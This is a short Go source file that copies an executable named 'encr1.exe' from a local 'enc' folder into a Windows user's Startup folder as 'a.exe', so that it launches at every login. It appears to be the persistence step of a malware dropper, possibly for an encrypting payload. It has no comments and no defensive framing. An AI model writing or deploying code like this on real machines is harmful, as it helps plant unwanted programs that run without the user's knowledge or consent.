package main

import (
	"fmt"
	"io"
	"os"
)

func main() {
	src, err := os.Open("./enc/encr1.exe")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	dest, err := os.Create("C:/Users/achon/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/a.exe")
	if err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	_, err = io.Copy(dest, src)
	if err != nil {
		fmt.Println(err)
		os.Exit(3)
	}
}
